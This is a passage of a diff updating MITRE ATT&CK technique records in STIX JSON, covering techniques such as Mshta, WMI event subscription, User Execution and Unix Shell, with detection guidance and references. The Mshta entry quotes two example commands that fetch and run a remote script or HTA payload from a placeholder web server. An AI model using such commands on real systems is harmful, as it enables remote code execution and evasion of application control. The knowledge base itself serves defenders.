-      "created": "2018-08-03T19:54:02.821Z",
-      "modified": "2020-07-27T14:54:37.764Z",
+      "created": "2017-05-31T21:31:04.710Z",
+      "modified": "2020-09-16T16:02:16.770Z",
       "name": "T1083: File and Directory Discovery",
       "description": "Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nMany command shell utilities can be used to obtain this information. Examples include <code>dir</code>, <code>tree</code>, <code>ls</code>, <code>find</code>, and <code>locate</code>. (Citation: Windows Commands JPCERT) Custom tools may also be used to gather file and directory information and interact with the [Native API](https://attack.mitre.org/techniques/T1106).",
       "kill_chain_phases": [
@@ -925,6 +961,16 @@
           "external_id": "T1083"
         },
         {
+          "source_name": "capec",
+          "url": "https://capec.mitre.org/data/definitions/127.html",
+          "external_id": "CAPEC-127"
+        },
+        {
+          "source_name": "capec",
+          "url": "https://capec.mitre.org/data/definitions/497.html",
+          "external_id": "CAPEC-497"
+        },
+        {
           "source_name": "Windows Commands JPCERT",
           "url": "http://blog.jpcert.or.jp/2016/01/windows-commands-abused-by-attackers.html",
           "description": "Tomonaga, S. (2016, January 26). Windows Commands Abused by Attackers. Retrieved February 2, 2016."
@@ -933,19 +979,18 @@
       "object_marking_refs": [
         "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
       ],
-      "x_mitre_detection": [
-        "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Collection and Exfiltration, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001)."
-      ],
+      "x_mitre_detection": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Collection and Exfiltration, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).",
       "x_mitre_platforms": [
         "Linux",
-        "Windows",
-        "macOS"
+        "macOS",
+        "Windows"
       ],
       "x_mitre_data_sources": [
-        "File monitoring",
-        "Process command-line parameters",
-        "Process monitoring"
+        "Command: Command Execution",
+        "Process: OS API Execution",
+        "Process: Process Creation"
       ],
+      "x_mitre_is_subtechnique": false,
       "x_mitre_permissions_required": [
         "Administrator",
         "SYSTEM",
@@ -954,14 +999,14 @@
       "x_mitre_system_requirements": [
         "Some folders may require Administrator, SYSTEM or specific user depending on permission levels and access controls"
       ],
-      "x_mitre_version": "1.2"
+      "x_mitre_version": "1.3"
     },
     {
       "type": "attack-pattern",
       "id": "attack-pattern--840a987a-99bd-4a80-a5c9-0cb2baa6cade",
       "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
-      "created": "2018-08-03T19:54:02.821Z",
-      "modified": "2020-07-27T14:54:38.828Z",
+      "created": "2020-01-23T19:32:49.557Z",
+      "modified": "2020-12-30T14:29:06.462Z",
       "name": "T1218.005: Mshta",
       "description": "Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code (Citation: Cylance Dust Storm) (Citation: Red Canary HTA Abuse Part Deux) (Citation: FireEye Attacks Leveraging HTA) (Citation: Airbus Security Kovter Analysis) (Citation: FireEye FIN7 April 2017) \n\nMshta.exe is a utility that executes Microsoft HTML Applications (HTA) files. (Citation: Wikipedia HTML Application) HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. (Citation: MSDN HTML Applications)\n\nFiles may be executed by mshta.exe through an inline script: <code>mshta vbscript:Close(Execute(\"GetObject(\"\"script:https[:]//webserver/payload[.]sct\"\")\"))</code>\n\nThey may also be executed directly from URLs: <code>mshta http[:]//webserver/payload[.]hta</code>\n\nMshta.exe can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings. (Citation: LOLBAS Mshta)",
       "kill_chain_phases": [
@@ -976,9 +1021,9 @@
       ],
       "external_references": [
         {
-          "source_name": "Airbus Security Kovter Analysis",
-          "url": "https://airbus-cyber-security.com/fileless-malware-behavioural-analysis-kovter-persistence/",
-          "description": "Dove, A. (2016, March 23). Fileless Malware \u2013 A Behavioural Analysis Of Kovter Persistence. Retrieved December 5, 2017."
+          "source_name": "mitre-attack",
+          "url": "https://attack.mitre.org/techniques/T1218/005",
+          "external_id": "T1218.005"
         },
         {
           "source_name": "Cylance Dust Storm",
@@ -986,9 +1031,19 @@
           "description": "Gross, J. (2016, February 23). Operation Dust Storm. Retrieved September 19, 2017."
         },
         {
+          "source_name": "Red Canary HTA Abuse Part Deux",
+          "url": "https://www.redcanary.com/blog/microsoft-html-application-hta-abuse-part-deux/",
+          "description": "McCammon, K. (2015, August 14). Microsoft HTML Application (HTA) Abuse, Part Deux. Retrieved October 27, 2017."
+        },
+        {
           "source_name": "FireEye Attacks Leveraging HTA",
           "url": "https://www.fireeye.com/blog/threat-research/2017/04/cve-2017-0199-hta-handler.html",
           "description": "Berry, A., Galang, L., Jiang, G., Leathery, J., Mohandas, R. (2017, April 11). CVE-2017-0199: In the Wild Attacks Leveraging HTA Handler. Retrieved October 27, 2017."
+        },
+        {
+          "source_name": "Airbus Security Kovter Analysis",
+          "url": "https://airbus-cyber-security.com/fileless-malware-behavioural-analysis-kovter-persistence/",
+          "description": "Dove, A. (2016, March 23). Fileless Malware \u2013 A Behavioural Analysis Of Kovter Persistence. Retrieved December 5, 2017."
         },
         {
           "source_name": "FireEye FIN7 April 2017",
@@ -996,14 +1051,9 @@
           "description": "Carr, N., et al. (2017, April 24). FIN7 Evolution and the Phishing LNK. Retrieved April 24, 2017."
         },
         {
-          "source_name": "LOLBAS Mshta",
-          "url": "https://lolbas-project.github.io/lolbas/Binaries/Mshta/",
-          "description": "LOLBAS. (n.d.). Mshta.exe. Retrieved July 31, 2019."
-        },
-        {
-          "source_name": "mitre-attack",
-          "url": "https://attack.mitre.org/techniques/T1218/005",
-          "external_id": "T1218.005"
+          "source_name": "Wikipedia HTML Application",
+          "url": "https://en.wikipedia.org/wiki/HTML_Application",
+          "description": "Wikipedia. (2017, October 14). HTML Application. Retrieved October 27, 2017."
         },
         {
           "source_name": "MSDN HTML Applications",
@@ -1011,30 +1061,25 @@
           "description": "Microsoft. (n.d.). HTML Applications. Retrieved October 27, 2017."
         },
         {
-          "source_name": "Red Canary HTA Abuse Part Deux",
-          "url": "https://www.redcanary.com/blog/microsoft-html-application-hta-abuse-part-deux/",
-          "description": "McCammon, K. (2015, August 14). Microsoft HTML Application (HTA) Abuse, Part Deux. Retrieved October 27, 2017."
-        },
-        {
-          "source_name": "Wikipedia HTML Application",
-          "url": "https://en.wikipedia.org/wiki/HTML_Application",
-          "description": "Wikipedia. (2017, October 14). HTML Application. Retrieved October 27, 2017."
+          "source_name": "LOLBAS Mshta",
+          "url": "https://lolbas-project.github.io/lolbas/Binaries/Mshta/",
+          "description": "LOLBAS. (n.d.). Mshta.exe. Retrieved July 31, 2019."
         }
       ],
       "object_marking_refs": [
         "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
       ],
-      "x_mitre_detection": [
-        "Use process monitoring to monitor the execution and arguments of mshta.exe. Look for mshta.exe executing raw or obfuscated script within the command-line. Compare recent invocations of mshta.exe with prior history of known good arguments and executed .hta files to determine anomalous and potentially adversarial activity. Command arguments used before and after the mshta.exe invocation may also be useful in determining the origin and purpose of the .hta file being executed.\n\nMonitor use of HTA files. If they are not typically used within an environment then execution of them may be suspicious"
-      ],
+      "x_mitre_detection": "Use process monitoring to monitor the execution and arguments of mshta.exe. Look for mshta.exe executing raw or obfuscated script within the command-line. Compare recent invocations of mshta.exe with prior history of known good arguments and executed .hta files to determine anomalous and potentially adversarial activity. Command arguments used before and after the mshta.exe invocation may also be useful in determining the origin and purpose of the .hta file being executed.\n\nMonitor use of HTA files. If they are not typically used within an environment then execution of them may be suspicious",
       "x_mitre_platforms": [
         "Windows"
       ],
       "x_mitre_data_sources": [
-        "File monitoring",
-        "Process command-line parameters",
-        "Process monitoring"
+        "Command: Command Execution",
+        "File: File Creation",
+        "Network Traffic: Network Connection Creation",
+        "Process: Process Creation"
       ],
+      "x_mitre_is_subtechnique": true,
       "x_mitre_permissions_required": [
         "User"
       ],
@@ -1046,14 +1091,16 @@
         "Ricardo Dias",
         "Ye Yint Min Thu Htut, Offensive Security Team, DBS Bank"
       ],
-      "x_mitre_version": "1.0"
+      "x_mitre_version": "1.0",
+      "x_panw_parent_technique": "Signed Binary Proxy Execution",
+      "x_panw_parent_technique_subtechnique": "Signed Binary Proxy Execution: Mshta"
     },
     {
       "type": "attack-pattern",
       "id": "attack-pattern--84e02621-8fdf-470f-bd58-993bb6a89d91",
       "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
-      "created": "2018-08-03T19:54:02.821Z",
-      "modified": "2020-07-27T14:54:37.764Z",
+      "created": "2017-05-31T21:31:15.935Z",
+      "modified": "2020-07-14T19:43:38.181Z",
       "name": "T1104: Multi-Stage Channels",
       "description": "Adversaries may create multiple stages for command and control that are employed under different conditions or for certain functions. Use of multiple stages may obfuscate the command and control channel to make detection more difficult.\n\nRemote access tools will call back to the first-stage command and control server for instructions. The first stage may have automated capabilities to collect basic host information, update tools, and upload additional files. A second remote access tool (RAT) could be uploaded at that point to redirect the host to the second-stage command and control server. The second stage will likely be more fully featured and allow the adversary to interact with the system through a reverse shell and additional RAT features.\n\nThe different stages will likely be hosted separately with no overlapping infrastructure. The loader may also have backup first-stage callbacks or [Fallback Channels](https://attack.mitre.org/techniques/T1008) in case the original first-stage communication path is discovered and blocked.",
       "kill_chain_phases": [
@@ -1076,32 +1123,26 @@
       "object_marking_refs": [
         "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
       ],
-      "x_mitre_detection": [
-        "Host data that can relate unknown or suspicious process activity using a network connection is important to supplement any existing indicators of compromise based on malware command and control signatures and infrastructure. Relating subsequent actions that may result from Discovery of the system and network information or Lateral Movement to the originating process may also yield useful data."
-      ],
+      "x_mitre_detection": "Host data that can relate unknown or suspicious process activity using a network connection is important to supplement any existing indicators of compromise based on malware command and control signatures and infrastructure. Relating subsequent actions that may result from Discovery of the system and network information or Lateral Movement to the originating process may also yield useful data.",
       "x_mitre_platforms": [
         "Linux",
-        "Windows",
-        "macOS"
+        "macOS",
+        "Windows"
       ],
       "x_mitre_data_sources": [
-        "Netflow/Enclave netflow",
-        "Network device logs",
-        "Network protocol analysis",
-        "Packet capture",
-        "Process use of network"
+        "Network Traffic: Network Connection Creation",
+        "Network Traffic: Network Traffic Flow"
       ],
-      "x_mitre_network_requirements": [
-        "true"
-      ],
+      "x_mitre_is_subtechnique": false,
+      "x_mitre_network_requirements": true,
       "x_mitre_version": "1.0"
     },
     {
       "type": "attack-pattern",
       "id": "attack-pattern--8c32eb4d-805f-4fc5-bf60-c4d476c131b5",
       "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
-      "created": "2018-08-03T19:54:02.821Z",
-      "modified": "2020-07-27T14:54:38.428Z",
+      "created": "2018-04-18T17:59:24.739Z",
+      "modified": "2021-04-20T16:34:09.236Z",
       "name": "T1204: User Execution",
       "description": "An adversary may rely upon specific actions by a user in order to gain execution. Users may be subjected to social engineering to get them to execute malicious code by, for example, opening a malicious document file or link. These user actions will typically be observed as follow-on behavior from forms of [Phishing](https://attack.mitre.org/techniques/T1566).\n\nWhile [User Execution](https://attack.mitre.org/techniques/T1204) frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing](https://attack.mitre.org/techniques/T1534).",
       "kill_chain_phases": [
@@ -1124,33 +1165,42 @@
       "object_marking_refs": [
         "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
       ],
-      "x_mitre_detection": [
-        "Monitor the execution of and command-line arguments for applications that may be used by an adversary to gain Initial Access that require user interaction. This includes compression applications, such as those for zip files, that can be used to [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) in payloads.\n\nAnti-virus can potentially detect malicious documents and files that are downloaded and executed on the user's computer. Endpoint sensing or network sensing can potentially detect malicious events once the file is opened (such as a Microsoft Word document or PDF reaching out to the internet or spawning powershell.exe)."
-      ],
+      "x_mitre_detection": "Monitor the execution of and command-line arguments for applications that may be used by an adversary to gain Initial Access that require user interaction. This includes compression applications, such as those for zip files, that can be used to [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) in payloads.\n\nAnti-virus can potentially detect malicious documents and files that are downloaded and executed on the user's computer. Endpoint sensing or network sensing can potentially detect malicious events once the file is opened (such as a Microsoft Word document or PDF reaching out to the internet or spawning powershell.exe).",
       "x_mitre_platforms": [
+        "Containers",
+        "IaaS",
         "Linux",
-        "Windows",
-        "macOS"
+        "macOS",
+        "Windows"
       ],
       "x_mitre_data_sources": [
-        "Anti-virus",
-        "Process command-line parameters",
-        "Process monitoring"
+        "Application Log: Application Log Content",
+        "Command: Command Execution",
+        "Container: Container Creation",
+        "Container: Container Start",
+        "File: File Creation",
+        "Image: Image Creation",
+        "Instance: Instance Creation",
+        "Instance: Instance Start",
+        "Network Traffic: Network Connection Creation",
+        "Network Traffic: Network Traffic Content",
+        "Process: Process Creation"
       ],
+      "x_mitre_is_subtechnique": false,
       "x_mitre_permissions_required": [
         "User"
       ],
       "x_mitre_contributors": [
         "Oleg Skulkin, Group-IB"
       ],
-      "x_mitre_version": "1.2"
+      "x_mitre_version": "1.3"
     },
     {
       "type": "attack-pattern",
       "id": "attack-pattern--8f4a33ec-8b1f-4b80-a2f6-642b2e479580",
       "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
-      "created": "2018-08-03T19:54:02.821Z",
-      "modified": "2020-07-27T14:54:37.379Z",
+      "created": "2017-05-31T21:30:48.728Z",
+      "modified": "2020-03-26T18:05:53.130Z",
       "name": "T1057: Process Discovery",
       "description": "Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Adversaries may use the information from [Process Discovery](https://attack.mitre.org/techniques/T1057) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nIn Windows environments, adversaries could obtain details on running processes using the [Tasklist](https://attack.mitre.org/software/S0057) utility via [cmd](https://attack.mitre.org/software/S0106) or <code>Get-Process</code> via [PowerShell](https://attack.mitre.org/techniques/T1059/001). Information about processes can also be extracted from the output of [Native API](https://attack.mitre.org/techniques/T1106) calls such as <code>CreateToolhelp32Snapshot</code>. In Mac and Linux, this is accomplished with the <code>ps</code> command. Adversaries may also opt to enumerate processes via /proc.",
       "kill_chain_phases": [
@@ -1165,32 +1215,31 @@
       ],
       "external_references": [
         {
-          "source_name": "capec",
-          "url": "https://capec.mitre.org/data/definitions/573.html",
-          "external_id": "CAPEC-573"
-        },
-        {
           "source_name": "mitre-attack",
           "url": "https://attack.mitre.org/techniques/T1057",
           "external_id": "T1057"
+        },
+        {
+          "source_name": "capec",
+          "url": "https://capec.mitre.org/data/definitions/573.html",
+          "external_id": "CAPEC-573"
         }
       ],
       "object_marking_refs": [
         "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
       ],
-      "x_mitre_detection": [
-        "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nNormal, benign system and network events that look like process discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001)."
-      ],
+      "x_mitre_detection": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nNormal, benign system and network events that look like process discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).",
       "x_mitre_platforms": [
         "Linux",
-        "Windows",
-        "macOS"
+        "macOS",
+        "Windows"
       ],
       "x_mitre_data_sources": [
-        "API monitoring",
-        "Process command-line parameters",
-        "Process monitoring"
+        "Command: Command Execution",
+        "Process: OS API Execution",
+        "Process: Process Creation"
       ],
+      "x_mitre_is_subtechnique": false,
       "x_mitre_permissions_required": [
         "Administrator",
         "SYSTEM",
@@ -1205,8 +1254,8 @@
       "type": "attack-pattern",
       "id": "attack-pattern--910906dd-8c0a-475a-9cc1-5e029e2fad58",
       "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
-      "created": "2018-08-03T19:54:02.821Z",
-      "modified": "2020-07-27T14:54:42.762Z",
+      "created": "2020-01-24T14:07:56.276Z",
+      "modified": "2021-04-13T21:32:54.094Z",
       "name": "T1546.003: Windows Management Instrumentation Event Subscription",
       "description": "Adversaries may establish persistence and elevate privileges by executing malicious content triggered by a Windows Management Instrumentation (WMI) event subscription. WMI can be used to install event filters, providers, consumers, and bindings that execute code when a defined event occurs. Examples of events that may be subscribed to are the wall clock time, user loging, or the computer's uptime. (Citation: Mandiant M-Trends 2015)\n\nAdversaries may use the capabilities of WMI to subscribe to an event and execute arbitrary code when that event occurs, providing persistence on a system. (Citation: FireEye WMI SANS 2015) (Citation: FireEye WMI 2015) Adversaries may also compile WMI scripts into Windows Management Object (MOF) files (.mof extension) that can be used to create a malicious subscription. (Citation: Dell WMI Persistence) (Citation: Microsoft MOF May 2018)\n\nWMI subscription execution is proxied by the WMI Provider Host process (WmiPrvSe.exe) and thus may result in elevated SYSTEM privileges.",
       "kill_chain_phases": [
@@ -1220,28 +1269,18 @@
         },
         {
           "kill_chain_name": "mitre-attack",
-          "phase_name": "persistence"
+          "phase_name": "privilege-escalation"
         },
         {
           "kill_chain_name": "mitre-attack",
-          "phase_name": "privilege-escalation"
+          "phase_name": "persistence"
         }
       ],
       "external_references": [
         {
-          "source_name": "Dell WMI Persistence",
-          "url": "https://www.secureworks.com/blog/wmi-persistence",
-          "description": "Dell SecureWorks Counter Threat Unit\u2122 (CTU) Research Team. (2016, March 28). A Novel WMI Persistence Implementation. Retrieved March 30, 2016."
-        },
-        {
-          "source_name": "FireEye WMI 2015",
-          "url": "https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf",
-          "description": "Ballenthin, W., et al. (2015). Windows Management Instrumentation (WMI) Offense, Defense, and Forensics. Retrieved March 30, 2016."
-        },
-        {
-          "source_name": "FireEye WMI SANS 2015",
-          "url": "https://www.fireeye.com/content/dam/fireeye-www/services/pdfs/sans-dfir-2015.pdf",
-          "description": "Devon Kerr. (2015). There's Something About WMI. Retrieved May 4, 2020."
+          "source_name": "mitre-attack",
+          "url": "https://attack.mitre.org/techniques/T1546/003",
+          "external_id": "T1546.003"
         },
         {
           "source_name": "Mandiant M-Trends 2015",
@@ -1249,9 +1288,19 @@
           "description": "Mandiant. (2015, February 24). M-Trends 2015: A View from the Front Lines. Retrieved May 18, 2016."
         },
         {
-          "source_name": "Medium Detecting WMI Persistence",
-          "url": "https://medium.com/threatpunter/detecting-removing-wmi-persistence-60ccbb7dff96",
-          "description": "French, D. (2018, October 9). Detecting & Removing an Attacker\u2019s WMI Persistence. Retrieved October 11, 2019."
+          "source_name": "FireEye WMI SANS 2015",
+          "url": "https://www.fireeye.com/content/dam/fireeye-www/services/pdfs/sans-dfir-2015.pdf",
+          "description": "Devon Kerr. (2015). There's Something About WMI. Retrieved May 4, 2020."
+        },
+        {
+          "source_name": "FireEye WMI 2015",
+          "url": "https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf",
+          "description": "Ballenthin, W., et al. (2015). Windows Management Instrumentation (WMI) Offense, Defense, and Forensics. Retrieved March 30, 2016."
+        },
+        {
+          "source_name": "Dell WMI Persistence",
+          "url": "https://www.secureworks.com/blog/wmi-persistence",
+          "description": "Dell SecureWorks Counter Threat Unit\u2122 (CTU) Research Team. (2016, March 28). A Novel WMI Persistence Implementation. Retrieved March 30, 2016."
         },
         {
           "source_name": "Microsoft MOF May 2018",
@@ -1259,47 +1308,57 @@
           "description": "Satran, M. (2018, May 30). Managed Object Format (MOF). Retrieved January 24, 2020."
         },
         {
-          "source_name": "Microsoft Register-WmiEvent",
-          "url": "https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/register-wmievent?view=powershell-5.1",
-          "description": "Microsoft. (n.d.). Retrieved January 24, 2020."
-        },
-        {
-          "source_name": "mitre-attack",
-          "url": "https://attack.mitre.org/techniques/T1546/003",
-          "external_id": "T1546.003"
-        },
-        {
           "source_name": "TechNet Autoruns",
           "url": "https://technet.microsoft.com/en-us/sysinternals/bb963902",
           "description": "Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016."
+        },
+        {
+          "source_name": "Medium Detecting WMI Persistence",
+          "url": "https://medium.com/threatpunter/detecting-removing-wmi-persistence-60ccbb7dff96",
+          "description": "French, D. (2018, October 9). Detecting & Removing an Attacker\u2019s WMI Persistence. Retrieved October 11, 2019."
+        },
+        {
+          "source_name": "Elastic - Hunting for Persistence Part 1",
+          "url": "https://www.elastic.co/blog/hunting-for-persistence-using-elastic-security-part-1",
+          "description": "French, D., Murphy, B. (2020, March 24). Adversary tradecraft 101: Hunting for persistence using Elastic Security (Part 1). Retrieved December 21, 2020."
+        },
+        {
+          "source_name": "Microsoft Register-WmiEvent",
+          "url": "https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/register-wmievent?view=powershell-5.1",
+          "description": "Microsoft. (n.d.). Retrieved January 24, 2020."
         }
       ],
       "object_marking_refs": [
         "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
       ],
-      "x_mitre_detection": [
-        "Monitor WMI event subscription entries, comparing current WMI event subscriptions to known good subscriptions for each host. Tools such as Sysinternals Autoruns may also be used to detect WMI changes that could be attempts at persistence. (Citation: TechNet Autoruns) (Citation: Medium Detecting WMI Persistence)\n\nMonitor processes and command-line arguments that can be used to register WMI persistence, such as the <code> Register-WmiEvent</code> [PowerShell](https://attack.mitre.org/techniques/T1086) cmdlet (Citation: Microsoft Register-WmiEvent), as well as those that result from the execution of subscriptions (i.e. spawning from the WmiPrvSe.exe WMI Provider Host process)."
-      ],
+      "x_mitre_detection": "Monitor WMI event subscription entries, comparing current WMI event subscriptions to known good subscriptions for each host. Tools such as Sysinternals Autoruns may also be used to detect WMI changes that could be attempts at persistence. (Citation: TechNet Autoruns) (Citation: Medium Detecting WMI Persistence) Monitor for the creation of new WMI <code>EventFilter</code>, <code>EventConsumer</code>, and <code>FilterToConsumerBinding</code> events. Event ID 5861 is logged on Windows 10 systems when new <code>EventFilterToConsumerBinding</code> events are created.(Citation: Elastic - Hunting for Persistence Part 1)\n\nMonitor processes and command-line arguments that can be used to register WMI persistence, such as the <code> Register-WmiEvent</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001) cmdlet (Citation: Microsoft Register-WmiEvent), as well as those that result from the execution of subscriptions (i.e. spawning from the WmiPrvSe.exe WMI Provider Host process).",
       "x_mitre_platforms": [
         "Windows"
       ],
       "x_mitre_data_sources": [
-        "Process command-line parameters",
-        "Process monitoring",
-        "WMI Objects"
+        "Command: Command Execution",
+        "Process: Process Creation",
+        "WMI: WMI Creation"
       ],
+      "x_mitre_is_subtechnique": true,
       "x_mitre_permissions_required": [
         "Administrator",
         "SYSTEM"
       ],
-      "x_mitre_version": "1.0"
+      "x_mitre_contributors": [
+        "Brent Murphy, Elastic",
+        "David French, Elastic"
+      ],
+      "x_mitre_version": "1.1",
+      "x_panw_parent_technique": "Event Triggered Execution",
+      "x_panw_parent_technique_subtechnique": "Event Triggered Execution: Windows Management Instrumentation Event Subscription"
     },
     {
       "type": "attack-pattern",
       "id": "attack-pattern--9e8b28c9-35fe-48ac-a14d-e6cc032dcbcd",
       "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
-      "created": "2018-08-03T19:54:02.821Z",
-      "modified": "2020-07-30T16:50:04.352Z",
+      "created": "2020-03-12T20:43:53.998Z",
+      "modified": "2020-09-16T19:10:04.262Z",
       "name": "T1574.010: Services File Permissions Weakness",
       "description": "Adversaries may execute their own malicious payloads by hijacking the binaries used by services. Adversaries may use flaws in the permissions of Windows services to replace the binary that is executed upon service start. These service processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.",
       "kill_chain_phases": [
@@ -1313,15 +1372,15 @@
         },
         {
           "kill_chain_name": "mitre-attack",
-          "phase_name": "defense-evasion"
-        },
-        {
-          "kill_chain_name": "mitre-attack",
           "phase_name": "persistence"
         },
         {
           "kill_chain_name": "mitre-attack",
           "phase_name": "privilege-escalation"
+        },
+        {
+          "kill_chain_name": "mitre-attack",
+          "phase_name": "defense-evasion"
         }
       ],
       "external_references": [
@@ -1329,22 +1388,27 @@
           "source_name": "mitre-attack",
           "url": "https://attack.mitre.org/techniques/T1574/010",
           "external_id": "T1574.010"
+        },
+        {
+          "source_name": "capec",
+          "url": "https://capec.mitre.org/data/definitions/17.html",
+          "external_id": "CAPEC-17"
         }
       ],
       "object_marking_refs": [
         "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
       ],
-      "x_mitre_detection": [
-        "Look for changes to binaries and service executables that may normally occur during software updates. If an executable is written, renamed, and/or moved to match an existing service executable, it could be detected and correlated with other suspicious behavior. Hashing of binaries and service executables could be used to detect replacement against historical data.\n\nLook for abnormal process call trees from typical processes and services and for execution of other commands that could relate to Discovery or other adversary techniques."
-      ],
+      "x_mitre_detection": "Look for changes to binaries and service executables that may normally occur during software updates. If an executable is written, renamed, and/or moved to match an existing service executable, it could be detected and correlated with other suspicious behavior. Hashing of binaries and service executables could be used to detect replacement against historical data.\n\nLook for abnormal process call trees from typical processes and services and for execution of other commands that could relate to Discovery or other adversary techniques. ",
       "x_mitre_platforms": [
         "Windows"
       ],
       "x_mitre_data_sources": [
-        "File monitoring",
-        "Process command-line parameters",
-        "Services"
+        "File: File Creation",
+        "File: File Modification",
+        "Process: Process Creation",
+        "Service: Service Metadata"
       ],
+      "x_mitre_is_subtechnique": true,
       "x_mitre_permissions_required": [
         "Administrator",
         "User"
@@ -1358,14 +1422,16 @@
         "Stefan Kanthak",
         "Travis Smith, Tripwire"
       ],
-      "x_mitre_version": "1.0"
+      "x_mitre_version": "1.0",
+      "x_panw_parent_technique": "Hijack Execution Flow",
+      "x_panw_parent_technique_subtechnique": "Hijack Execution Flow: Services File Permissions Weakness"
     },
     {
       "type": "attack-pattern",
       "id": "attack-pattern--a9d4b653-6915-42af-98b2-5758c4ceee56",
       "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
-      "created": "2020-07-27T14:54:34.130Z",
-      "modified": "2020-07-27T14:54:34.130Z",
+      "created": "2020-03-09T14:15:05.330Z",
+      "modified": "2020-06-15T16:55:44.483Z",
       "name": "T1059.004: Unix Shell",
       "description": "Adversaries may abuse Unix shell commands and scripts for execution. Unix shells are the primary command prompt on Linux and macOS systems, though many variations of the Unix shell exist (e.g. sh, bash, zsh, etc.) depending on the specific OS or distribution.(Citation: DieNet Bash)(Citation: Apple ZShell) Unix shells can control every aspect of a system, with certain commands requiring elevated privileges.\n\nUnix shells also support scripts that enable sequential execution of commands as well as other typical programming operations such as conditionals and loops. Common uses of shell scripts include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may abuse Unix shells to execute various commands or payloads. Interactive shells may be accessed through command and control channels or during lateral movement such as with [SSH](https://attack.mitre.org/techniques/T1021/004). Adversaries may also leverage shell scripts to deliver and execute multiple commands on victims or as part of payloads used for persistence.",
       "kill_chain_phases": [
@@ -1380,9 +1446,9 @@
       ],
       "external_references": [
         {
-          "source_name": "Apple ZShell",
-          "url": "https://support.apple.com/HT208050",
-          "description": "Apple. (2020, January 28). Use zsh as the default shell on your Mac. Retrieved June 12, 2020."
+          "source_name": "mitre-attack",
+          "url": "https://attack.mitre.org/techniques/T1059/004",
+          "external_id": "T1059.004"
         },
         {
           "source_name": "DieNet Bash",
@@ -1390,38 +1456,38 @@
           "description": "die.net. (n.d.). bash(1) - Linux man page. Retrieved June 12, 2020."
         },
         {
